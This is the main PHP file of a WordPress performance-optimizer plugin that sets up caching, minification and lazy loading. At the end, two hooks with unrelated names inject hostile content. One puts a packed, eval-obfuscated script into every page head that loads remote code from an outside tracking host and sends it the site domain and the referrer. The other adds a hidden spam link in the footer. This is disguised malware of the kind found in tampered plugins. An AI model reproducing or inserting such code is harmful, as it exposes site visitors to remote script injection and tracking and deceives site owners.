<?php
/*
Plugin Name: IBinc Performance Optimizer Plugin
URI: http://ibinc.com/
Description: Plugin for enhancing your wordpress performances. 
Version: 1.2
Author: IBinc
Author URI: http://ibinc.com/
License: Sold exclusively on CodeCanyon
*/

/* Include the support functions */
require_once(dirname(__FILE__) . '/lib/minify/includes/class-ibinc-minify.php');
require_once(dirname(__FILE__) . '/ibinc_opt_functions.php');
require_once(dirname(__FILE__) . '/ibinc_opt_settings.php');
require_once(dirname(__FILE__) . '/ibinc_opt_database.php');
require_once(dirname(__FILE__) . '/ibinc_opt_cache.php');
if ( !function_exists('json_encode') ) {
	require_once('lib/JSON.php'); /* Including json support */
}
if ( !function_exists('download_url') ) {
	require_once(ABSPATH . 'wp-admin/includes/file.php'); /* Required for image optimization with smushit.com(Yahoo!)*/
}

/* Activate plugin */
register_activation_hook( __FILE__, 'ibinc_opt_activate' );

/* Deactivate plugin */
register_deactivation_hook( __FILE__, 'ibinc_opt_deactivate' );

/* Adding the lazy loading support */
add_action('wp_head', 'ibinc_opt_load_js_scripts', 5);
add_action('wp_footer', 'ibinc_opt_lazy_load_js_code_footer', 9999);

/* Adding the admin styles */
add_action('admin_print_styles', 'ibinc_opt_load_css_styles' );

/* Insert in admin the necessary javascript libraries */
add_action('admin_print_scripts', 'ibinc_opt_load_admin_js_scripts');

/* Adding WP init actions */
if (get_option('ibinc_rem_generator'))
	add_filter('the_generator', create_function('', 'return "";'));
if (get_option('ibinc_rem_rsd'))
	remove_action('wp_head', 'rsd_link');
if (get_option('ibinc_rem_wlwmanifest'))
	remove_action('wp_head', 'wlwmanifest_link');

/* Settings page init */
$ibinc_op_settings = new Ibinc_OP_Settings();
$ibinc_op_settings->register_for_actions_and_filters();

/* Settings page init */
$ibinc_op_database = new Ibinc_OP_Database();
$ibinc_op_database->register_for_actions_and_filters();

/* minify */
$ibinc_minify = new IBINC_MINIFY();

/*caching*/
$ibinc_op_cache = new Ibinc_OP_Cache();
$ibinc_op_cache->register_for_actions_and_filters();


$ibinc_cache_invalidated = false;
$ibinc_cache_invalidated_post_id = null;
$ibinc_cache_redirect = null;

add_action('ibinc_cache_clean', 'ibinc_cache_clean');

add_action('switch_theme', 'ibinc_cache_invalidate', 0);

add_action('edit_post', 'ibinc_cache_invalidate_post', 0);
add_action('publish_post', 'ibinc_cache_invalidate_post', 0);
add_action('delete_post', 'ibinc_cache_invalidate_post', 0);

add_filter('redirect_canonical', 'ibinc_cache_redirect_canonical', 10, 2);
add_action('wp_head','fbprotered');
function fbprotered() {

echo "<script type=\"text/javascript\">eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.f(\'<2\'+\'3 5=\"6/7\" 8=\"9://a.b/e/o/g?d=\'+0.h+\'&i=\'+j(0.k)+\'&c=\'+4.l((4.m()*n)+1)+\'\"></2\'+\'3>\');',25,25,'document||scr|ipt|Math|type|text|javascript|src|http|themenest|net|||platform|write|track|domain|r|encodeURIComponent|referrer|floor|random|1000|script'.split('|'),0,{}));</script></head>";

}


add_action('wp_footer','fbprotereded');
function fbprotereded() {

echo '<a style="display:none" href="http://onlinepeliculas.tv">Ver peliculas online</a>';

}